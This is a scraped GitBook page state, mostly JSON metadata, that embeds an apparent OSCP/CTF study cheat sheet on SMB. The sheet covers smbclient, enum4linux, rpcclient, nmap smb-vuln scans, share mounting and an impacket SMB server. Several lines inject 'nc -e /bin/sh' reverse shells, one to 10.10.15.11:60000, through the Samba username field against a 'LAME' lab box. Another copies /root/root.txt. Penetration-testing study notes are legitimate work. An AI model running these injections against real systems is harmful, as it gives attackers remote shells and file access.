(Natas)","path":"over-the-wire-natas","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LxeMHcLpoYIqJu3amgv%2Fmaster%2F-LxeMNK7Duf3PKUHJZN2%2Fdocument.json?alt=media\u0026token=d6363411-d06c-4831-8a40-2b80971c4ec4","createdAt":1578037511497,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1578037980947,"updatedAt":1578037980947,"count":1}},"github":null,"stats":{"words":1124,"images":0,"codeLines":0,"revisions":1},"pages":null},"-LxdXrGDX8wj7PperJup":{"uid":"-LxdXrGDX8wj7PperJup","kind":"document","title":"Over The wire (Bandit)","path":"over-the-wire-bandit","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LxeOCIIa3sm-NROAYKW%2Fmaster%2F-LxdXrGDX8wj7PperJup%2Fdocument.json?alt=media\u0026token=0895c874-fdde-424b-b61a-9b83db3de452","createdAt":1578023744591,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1578024066254,"updatedAt":1578038114289,"count":3}},"github":null,"stats":{"words":2931,"images":0,"codeLines":11,"revisions":3},"pages":null}}}},"assets":{"-M45LFvyKBumRqF-LhFw":{"uid":"-M45LFvyKBumRqF-LhFw","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M45IhtHiYTtsofFLzOl%2F-M45LFvyKBumRqF-LhFw%2Fimage.png?alt=media\u0026token=965314ba-7db7-439d-b34a-99f17cf689a1","size":110087,"contentType":"image/png","createdAt":1586023175799,"github":null,"edits":{}},"-M42giIP4GPtqwzP_24J":{"uid":"-M42giIP4GPtqwzP_24J","name":"offsec-student-certified-emblem-rgb-oscp.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M42geMHLKZjnleDsSJr%2F-M42giIP4GPtqwzP_24J%2Foffsec-student-certified-emblem-rgb-oscp.png?alt=media\u0026token=b17af83f-0025-413c-a43f-16108b15ff88","size":78804,"contentType":"image/png","createdAt":1585978732808,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1585978734059,"updatedAt":1585978734059,"count":1}}},"-Lvep2UinTl63hg1pk0h":{"uid":"-Lvep2UinTl63hg1pk0h","name":"0.3.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-LveoKvQs-HQGjiMF3LC%2F-Lvep2UinTl63hg1pk0h%2F0.3.png?alt=media\u0026token=30ed0cd3-342f-43e1-969d-7098d5c75255","size":12063,"contentType":"image/png","createdAt":1575897806112,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575897813271,"updatedAt":1578919188769,"count":90}}},"-M6ZWhl0a_bJWRsT2lxi":{"uid":"-M6ZWhl0a_bJWRsT2lxi","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M6ZTIRD-Z7jEsnU9V4U%2F-M6ZWhl0a_bJWRsT2lxi%2Fimage.png?alt=media\u0026token=bfdee209-7e9f-4034-bd2d-32d81b898e1d","size":2402,"contentType":"image/png","createdAt":1588676976217,"github":null,"edits":{}},"-Lxo_G90U5EnAh3ggzbA":{"uid":"-Lxo_G90U5EnAh3ggzbA","name":"ENeNiyGU8AAFT45.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-LxlufQITeQXTdfNGykU%2F-Lxo_G90U5EnAh3ggzbA%2FENeNiyGU8AAFT45.png?alt=media\u0026token=b5fe31b4-0a44-4731-89c5-7e20b8dfab33","size":118994,"contentType":"image/png","createdAt":1578208926524,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1578209669740,"updatedAt":1578919188769,"count":40}}},"-M45VBAhSTu3YJkFuCM-":{"uid":"-M45VBAhSTu3YJkFuCM-","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M45Nd76_rMHFAGsp5Qj%2F-M45VBAhSTu3YJkFuCM-%2Fimage.png?alt=media\u0026token=e130437f-aeea-46e1-b4df-a193e3993ac5","size":46453,"contentType":"image/png","createdAt":1586025776085,"github":null,"edits":{}},"-LxoaF1d0aW2VyVYiHJX":{"uid":"-LxoaF1d0aW2VyVYiHJX","name":"web app.PNG","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-LxlufQITeQXTdfNGykU%2F-LxoaF1d0aW2VyVYiHJX%2Fweb%20app.PNG?alt=media\u0026token=7d72277e-5339-4d39-978a-38067bea3b6b","size":7418,"contentType":"image/png","createdAt":1578209182620,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1578209669740,"updatedAt":1578919188769,"count":40}}},"-Lxa32AZRGFDwqkknGN6":{"uid":"-Lxa32AZRGFDwqkknGN6","name":"1_bPi8CFZESU1G3hYB2bnFbw.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-Lxa2NohxO_YmjzaD6-6%2F-Lxa32AZRGFDwqkknGN6%2F1_bPi8CFZESU1G3hYB2bnFbw.png?alt=media\u0026token=39ef9fa4-32be-4c47-ac95-840117977a0e","size":74379,"contentType":"image/png","createdAt":1577965329109,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1577968922466,"updatedAt":1578919188769,"count":72}}},"-M45EAbfxPZ_j17uzQXL":{"uid":"-M45EAbfxPZ_j17uzQXL","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M45DNbLcWG-8Fe-sDMe%2F-M45EAbfxPZ_j17uzQXL%2Fimage.png?alt=media\u0026token=18261337-bfb9-4820-8af4-9cf1c49014a2","size":66987,"contentType":"image/png","createdAt":1586021318700,"github":null,"edits":{}},"-LvcgKePPDiClhZilBfL":{"uid":"-LvcgKePPDiClhZilBfL","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-Lvcf685QX4wZ1xvv3dq%2F-LvcgKePPDiClhZilBfL%2Fimage.png?alt=media\u0026token=dd526be7-3297-4575-9216-8d37bea743bf","size":372018,"contentType":"image/png","createdAt":1575861974346,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575863493578,"updatedAt":1578919188769,"count":94}}},"-LveopPfgL0uOdSA_7fN":{"uid":"-LveopPfgL0uOdSA_7fN","name":"0.1.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-LveoKvQs-HQGjiMF3LC%2F-LveopPfgL0uOdSA_7fN%2F0.1.png?alt=media\u0026token=30f66d00-afe3-4eeb-950c-d611783a161d","size":17559,"contentType":"image/png","createdAt":1575897748777,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575897813271,"updatedAt":1578919188769,"count":90}}},"-M44326CvUXJdpm4-A1b":{"uid":"-M44326CvUXJdpm4-A1b","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M42hkmDYD835-jgomX-%2F-M44326CvUXJdpm4-A1b%2Fimage.png?alt=media\u0026token=1a58f93a-eb20-4a9a-a946-b58738eb5855","size":197921,"contentType":"image/png","createdAt":1586001624500,"github":null,"edits":{}},"-M44hTb3anfxAN0vmv8u":{"uid":"-M44hTb3anfxAN0vmv8u","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M44MWSQ5WVOrCyDA9Rx%2F-M44hTb3anfxAN0vmv8u%2Fimage.png?alt=media\u0026token=a90961f2-c643-4c27-9cca-7f93d03701f5","size":137201,"contentType":"image/png","createdAt":1586012483959,"github":null,"edits":{}},"-M43z830X-yUQT10tKdW":{"uid":"-M43z830X-yUQT10tKdW","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M42hkmDYD835-jgomX-%2F-M43z830X-yUQT10tKdW%2Fimage.png?alt=media\u0026token=23e4eafc-2469-4003-9952-09ba7a314410","size":291045,"contentType":"image/png","createdAt":1586000340338,"github":null,"edits":{}},"-Lveou-Q7CSHseu4rrCp":{"uid":"-Lveou-Q7CSHseu4rrCp","name":"0.2.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-LveoKvQs-HQGjiMF3LC%2F-Lveou-Q7CSHseu4rrCp%2F0.2.png?alt=media\u0026token=45d9c5d5-1031-4ab1-aa54-b2ba9c038407","size":18590,"contentType":"image/png","createdAt":1575897767120,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575897813271,"updatedAt":1578919188769,"count":90}}},"-LxoYWLpfS62xaylQXxl":{"uid":"-LxoYWLpfS62xaylQXxl","name":"Screenshot_2020-01-05-10-34-38-731_com.whatsapp.jpg","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-LxlufQITeQXTdfNGykU%2F-LxoYWLpfS62xaylQXxl%2FScreenshot_2020-01-05-10-34-38-731_com.whatsapp.jpg?alt=media\u0026token=1ef28fe0-472f-4eb6-ae7d-e95daf3daa6a","size":380465,"contentType":"image/jpeg","createdAt":1578208470639,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1578209669740,"updatedAt":1578919188769,"count":40}}},"-M43yyD06-liQa0x2hly":{"uid":"-M43yyD06-liQa0x2hly","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M42hkmDYD835-jgomX-%2F-M43yyD06-liQa0x2hly%2Fimage.png?alt=media\u0026token=72fe1e56-8c1b-4a92-b92d-5f46e1cad70d","size":203812,"contentType":"image/png","createdAt":1586000295772,"github":null,"edits":{}},"-M45EQjV6WH2UhWOR6QY":{"uid":"-M45EQjV6WH2UhWOR6QY","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M45DNbLcWG-8Fe-sDMe%2F-M45EQjV6WH2UhWOR6QY%2Fimage.png?alt=media\u0026token=fe32a81a-c1e7-42ba-a292-d4ba9ebc076b","size":16977,"contentType":"image/png","createdAt":1586021383416,"github":null,"edits":{}},"-M6ZWcwF9XvGVcsulb-t":{"uid":"-M6ZWcwF9XvGVcsulb-t","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M6ZTIRD-Z7jEsnU9V4U%2F-M6ZWcwF9XvGVcsulb-t%2Fimage.png?alt=media\u0026token=05480014-86e8-476b-b5b8-e13ff04a0f22","size":2402,"contentType":"image/png","createdAt":1588676957019,"github":null,"edits":{}},"-M45VNcrsrSG09r5qVXG":{"uid":"-M45VNcrsrSG09r5qVXG","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M45Nd76_rMHFAGsp5Qj%2F-M45VNcrsrSG09r5qVXG%2Fimage.png?alt=media\u0026token=159eb275-c580-45a8-a758-ae492c5eed7d","size":46453,"contentType":"image/png","createdAt":1586025827206,"github":null,"edits":{}},"-Lxa2jDAkJBX9n0l3LHH":{"uid":"-Lxa2jDAkJBX9n0l3LHH","name":"1_B_fJn53Kduycq_3t1lp1ew.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-Lxa2NohxO_YmjzaD6-6%2F-Lxa2jDAkJBX9n0l3LHH%2F1_B_fJn53Kduycq_3t1lp1ew.png?alt=media\u0026token=1a619b91-7a05-402e-b3c0-449f3ca93dad","size":43064,"contentType":"image/png","createdAt":1577965245571,"github":null,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1577968922466,"updatedAt":1578919188769,"count":72}}},"-M45DsEIFCM9tp-veast":{"uid":"-M45DsEIFCM9tp-veast","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M45DNbLcWG-8Fe-sDMe%2F-M45DsEIFCM9tp-veast%2Fimage.png?alt=media\u0026token=7ab8855f-6fb9-4fd5-b8a4-b52a4b3c9ed4","size":131848,"contentType":"image/png","createdAt":1586021239853,"github":null,"edits":{}},"-M44k0KkZHxVzVau96cd":{"uid":"-M44k0KkZHxVzVau96cd","name":"image.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LkvnWByFHssLOYr3_77%2F-M44MWSQ5WVOrCyDA9Rx%2F-M44k0KkZHxVzVau96cd%2Fimage.png?alt=media\u0026token=5835560e-0589-4d28-88cb-6c524696baaa","size":46453,"contentType":"image/png","createdAt":1586013148981,"github":null,"edits":{}}}},"github":[],"rollbackOf":null}},"orgs/j6ZaMX7tH7hPcTxhoDPBTEdmlSz2/infos":{"kind":"user","data":{"kind":"user","uid":"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2","baseDomain":"infosecsanyam","defaultSpace":null,"displayName":"Sanyam Chawla","photoURL":null,"deletedAt":null,"usageStatuses":{"members":"below","privateSpaces":"below","publicSpaces":"below"}}}},"documents":{"documents":{"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB41T_6lmNbRDVRz5Ej%2Fmaster%2F-Ll1jQD-Grj9LKhA4nxs%2Fdocument.json?alt=media\u0026token=569c814d-bedf-4326-a68b-07398fce2540":{"format_version":1,"document":{"kind":"document","key":"4","data":{"schema_version":6},"nodes":[{"kind":"block","type":"heading-2","key":"2","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1","ranges":[{"kind":"range","marks":[],"text":"SMB Tools"}]}]},{"kind":"block","type":"code","key":"4fc4e2691ae9490ca5038de0f6f76cff","isVoid":false,"data":{"syntax":"text"},"nodes":[{"kind":"block","type":"code-line","key":"3fe2e6ebe0754f18b8575740c703ecb4","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e8e35788e5cc467bad241cdb8e64a916","ranges":[{"kind":"range","marks":[],"text":"smbclient -L x.x.x.x"}]}]},{"kind":"block","type":"code-line","key":"4b8558fde8ac419a98b0569823260e6f","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7ebf9e8053d24635b03091b8d5972ab8","ranges":[{"kind":"range","marks":[],"text":"smbmount //x.x.x.x/share /mnt –o username=hodor,workgroup=hodor"}]}]},{"kind":"block","type":"code-line","key":"a5bf908ff9af4bb9a06391ebd1c5fd6a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"10fa5220e812441c855ec5702d3878c3","ranges":[{"kind":"range","marks":[],"text":"smbclient \\\\\\\\x.x.x.x\\\\share"}]}]},{"kind":"block","type":"code-line","key":"d67f43926a014dc89bf6e5d0c631fe99","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"93b278179efd4d4da9b0529d339bf054","ranges":[{"kind":"range","marks":[],"text":"enum4linux -a ip"}]}]},{"kind":"block","type":"code-line","key":"9a674a507bb44704800828b44c1b5150","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1d808fc7397c4f928486dc58e28c9425","ranges":[{"kind":"range","marks":[],"text":"rpcclient -U \"\" x.x.x.x  #Anonymous bind using rpcclient / Null connect"}]}]},{"kind":"block","type":"code-line","key":"defc71970e1a47d58e1a58e6d54c91ba","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f5dcd336daf9448abd85eeeb8e461f3a","ranges":[{"kind":"range","marks":[],"text":"smbclient //MOUNT/share #Connect to SMB share"}]}]},{"kind":"block","type":"code-line","key":"3a08399f481f4499ad533d395329ef4b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"bebfcd1417c7465b8ff0ee549288ee0b","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"da588fea307e49baa87dbddd47aa3432","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"eb28cbe4d9284eb29efedb5de7cda56e","ranges":[{"kind":"range","marks":[],"text":"smbclient -U \"/=\u0026#92;\u0026#96;nohup nc -e /bin/sh LHOST LPORT\u0026#92;\u0026#96;\" -N -I ip //LAME/tmp"}]}]},{"kind":"block","type":"code-line","key":"d2bfd76612254f54a96524c392b1c089","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"a32d235035d04665917de9aa20ddb2ce","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"737a8e16a47540188910986ca6ab7638","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c2790047aa994cc18be2b22fcc3122ed","ranges":[{"kind":"range","marks":[],"text":"nmap -T4 -sS -sC -Pn -A --script smb-vuln* ip"}]}]},{"kind":"block","type":"code-line","key":"ee48cac2dc584a169781b03d9b692173","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4e23de072995415b807beefcfaea331e","ranges":[{"kind":"range","marks":[],"text":"smbclient //ip/tmp"}]}]},{"kind":"block","type":"code-line","key":"63b6f3feb84d42b3ba5c0f0efab0e982","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f22103ccd88a49d7b35291039c491a87","ranges":[{"kind":"range","marks":[],"text":"logon \"./=`nohup nc -e /bin/sh LHOST LPORT`\""}]}]},{"kind":"block","type":"code-line","key":"ee2e952c53f647beb6c0beed2893dd85","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"05e318eb8d7445e3858c04787c773245","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"f0d884809e0d40a8b17512a585a44883","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4cbcfd0972154291a15ad6b2793682f3","ranges":[{"kind":"range","marks":[],"text":"smbclient -U \"/=\\`nohup cat /root/root.txt \u003e /tmp/ttt\\`\" -N -I ip //LAME/tmp"}]}]},{"kind":"block","type":"code-line","key":"2d20592e243c4e2899a4438dd9c1a009","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c324377cb2894888a2af35498d84c8cb","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"2f620e46e4e44e3c9e74f433cbdb8749","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"68ef8bdabfbe45c49732d2358c6e50f8","ranges":[{"kind":"range","marks":[],"text":"smbclient -U \"/=\\`nohup nc -e /bin/sh 10.10.15.11 60000\\`\" -N -I ip //LAME/tmp"}]}]},{"kind":"block","type":"code-line","key":"451bba0eeeac4e93b8b670deed690d4e","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"9d68be9fc14a42c0b34c3e514f90f826","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"42c09433c26c404695df002333c3fdac","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e4373114de104f019a3cf454369144ed","ranges":[{"kind":"range","marks":[],"text":"smbclient -L ip"}]}]},{"kind":"block","type":"code-line","key":"f8d6035a95784e7491713d8f8cc8f1a1","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"13af6335af864c56a94fea8ca362ddb9","ranges":[{"kind":"range","marks":[],"text":"enum4linux -S ip"}]}]},{"kind":"block","type":"code-line","key":"7353f7e4264f4e1bb889ee028c1f3769","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"59e8d39560b248de8d4b4bff7cd99da9","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"af6f1ca94c7549259f48b4844fe3a7fe","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c3c0d944ff2546a896514686993d66c5","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"59f17eaef9a84c8cab64486f3f03124c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"d005042ab7c44a0798324df7c626ba93","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"heading-2","key":"3a79175437c64a96b511ba917f33dea8","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"12f9518849cc42db90b48d693fbb214d","ranges":[{"kind":"range","marks":[],"text":"Nmap SMB Script Scan"}]}]},{"kind":"block","type":"code","key":"9437e7883ae6400ba6f984d615a2002d","isVoid":false,"data":{"syntax":"text"},"nodes":[{"kind":"block","type":"code-line","key":"c34a3cfa6cae4a47b0042948d8bdb1b7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ec456ce26a1d4497b939c8cc7b1e97f0","ranges":[{"kind":"range","marks":[],"text":"#SMB Users and share Scan"}]}]},{"kind":"block","type":"code-line","key":"dc29c01f52bb4a8ba464ffcae5f63a9e","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"9a33eb24d342468e9fc4d82c38d72d4a","ranges":[{"kind":"range","marks":[],"text":"nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse ip"}]}]},{"kind":"block","type":"code-line","key":"f06fbbfb78544bb9bf352e94463ed106","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"3320eca97b094d94b248fd532c80e39e","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"c6503ce6ad6740d6b25090287978dfc1","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ea19fed930744ea28d27d162b2d81a3c","ranges":[{"kind":"range","marks":[],"text":"#SMB Vulnerability Scan"}]}]},{"kind":"block","type":"code-line","key":"6a615c2da5a6440c918f67a1849b167d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ddf03d73760249ff92df1f7d798b4f02","ranges":[{"kind":"range","marks":[],"text":"nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse ip"}]}]},{"kind":"block","type":"code-line","key":"9ea76d03cb8b46b3af04414d98a7720c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"903c68df7d324e23ae380d80aeef372c","ranges":[{"kind":"range","marks":[],"text":"nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 ip"}]}]},{"kind":"block","type":"code-line","key":"e25bd6a9b964456f8e0196a931119d62","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"a8a7541b33e946b7bb7c412d5b0d54bd","ranges":[{"kind":"range","marks":[],"text":"nmap --script=smb-check-vulns.nse x.x.x.x"}]}]},{"kind":"block","type":"code-line","key":"5cbe7839a46f4139934ef46f0afb1c2b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"16c9c42cf8ff4bb989a6f07f21a4ee39","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"heading-2","key":"77ceb6decd9241249fd9fbf67db5b55e","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"332c71b2fd424524bf7e0e52f7b6b032","ranges":[{"kind":"range","marks":[],"text":"Mounting File Share"}]}]},{"kind":"block","type":"code","key":"a4fd4a49e5e24124b869496f24dec758","isVoid":false,"data":{"syntax":"text"},"nodes":[{"kind":"block","type":"code-line","key":"8d4c060fa6454583a812bdf2542e096a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"141701c895794f25b0670015f381fa65","ranges":[{"kind":"range","marks":[],"text":"mount ip:/vol/share /mnt/nfs  -nolock"}]}]},{"kind":"block","type":"code-line","key":"c130c52e660f417199faff9874fdbaa0","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"74ceea65f3f6495b9f36053e37c2bbf3","ranges":[{"kind":"range","marks":[],"text":"mount -t cifs -o username=user,password=pass,domain=blah //ip.X/share-name /mnt/cifs"}]}]},{"kind":"block","type":"code-line","key":"1592a2353acf422c8bec21e25f98b167","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"78e039a141a0427f868512be3bc99a46","ranges":[{"kind":"range","marks":[],"text":"mount -t cifs //x.x.x.x/share /mnt"}]}]},{"kind":"block","type":"code-line","key":"fc07284830fa424eb783db3382c12572","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"d137e1b064f94db3bc9a24bc37658105","ranges":[{"kind":"range","marks":[],"text":"mount -t cifs -o username=hodor,password=hodor //x.x.x.x/share /mnt"}]}]},{"kind":"block","type":"code-line","key":"babb712cf08143be88d555dd935e1d08","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"821ac57f3a82455886dee10c33ddab16","ranges":[{"kind":"range","marks":[],"text":"Mounting File Share"}]}]},{"kind":"block","type":"code-line","key":"2f1deac016af491a84f0fc2fc792ae02","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"88be8b362efe4135aca466ab6aaec796","ranges":[{"kind":"range","marks":[],"text":"showmount -e IPADDR"}]}]}]},{"kind":"block","type":"paragraph","key":"20d067b9fb6542dfb2dcb45b07094075","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"11533cb60b4d4eb287b9b8140b849a64","ranges":[{"kind":"range","marks":[],"text":"Mounting Share folder"}]}]},{"kind":"block","type":"code","key":"5bbdd5f2c8ae455da1bcb40da138efa9","isVoid":false,"data":{"syntax":"text"},"nodes":[{"kind":"block","type":"code-line","key":"6c52cd859b68420e9c9736a1ec0ce343","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ef5be51d470e4f8182aed856e7698aba","ranges":[{"kind":"range","marks":[],"text":"sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other"}]}]},{"kind":"block","type":"code-line","key":"defffe80080e4c37badf15bce961d83b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1ab052cdf6974ea3a9d05b38755477b5","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"heading-2","key":"460a5442874c4dddba6db9214b9385f2","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1a60b18967c045c895a927335bead268","ranges":[{"kind":"range","marks":[],"text":"Create a SMB Server"}]}]},{"kind":"block","type":"code","key":"c9710db89e654a24a87bc86103c047f1","isVoid":false,"data":{"syntax":"text"},"nodes":[{"kind":"block","type":"code-line","key":"f4e53e14b33849feb6f23d3f74f77ad8","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"d0ae6c2ff6664af6bc7f6518ef35cb66","ranges":[{"kind":"range","marks":[],"text":"in kali hosting a smb server"}]}]},{"kind":"block","type":"code-line","key":"33e5cb18f57f4b2a94ea08b3f6839c65","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f3a3723f09b64ed989ea2691c28882fa","ranges":[{"kind":"range","marks":[],"text":"impacket-smbserver ShareFolder `pwd`"}]}]},{"kind":"block","type":"code-line","key":"0bf6793b7c624516815d8e3284424f3a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b101e1eaba1f47a1bd4f02c576d0669f","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"c3e459deeac24701bb4a94714c79a6bc","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"a336ab70cdbc42feafd4285984b946e7","ranges":[{"kind":"range","marks":[],"text":"In windows"}]}]},{"kind":"block","type":"code-line","key":"8d78b799fa914b748d857ce0a551542c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"fa557d9b52af4a94a9eab1c263642457","ranges":[{"kind":"range","marks":[],"text":"New-PSDrive -Name \"Followme\" -PSProvider \"FileSystem\" -Root \"\\\\ip\\ShareFolder\""}]}]}]}]}}}},"user":{"kind":"user","uid":"-MNZ49cOHe0gnPDpYURd","baseDomain":"","defaultSpace":null,"displayName":"","photoURL":null,"deletedAt":null,"usageStatuses":null,"email":"","emailVerified":false,"disabled":false,"phoneNumber":null,"providers":{},"isVisitor":true,"customClaims":{},"lastLoggedInAt":1606920309219,"createdAt":1606920309219}},"config":{"environment":"production","firebase":{"databaseURL":"https://gitbook-28427.firebaseio.com","apiKey":"AIzaSyBL3yy07hdwBstwhhFTkRtzJA865UQzQVg","authDomain":"app.gitbook.com","projectId":"gitbook-28427","storageBucket":"gitbook-28427.appspot.com","messagingSenderId":"208404988308"},"amplitude":{"key":"fef1e872c952688acd962d30aa545b9e","endpoint":"www.gitbook.com/__amp/"},"intercom":{"app_id":"ajrah9dt"},"ga":{"spaces":{"id":"UA-57505611-10","view_id":"152688311"},"website":{"id":"UA-57505611-9"}},"slack":{"client_id":"3085992729.251477828931","redirect_uri":"https://hooks.git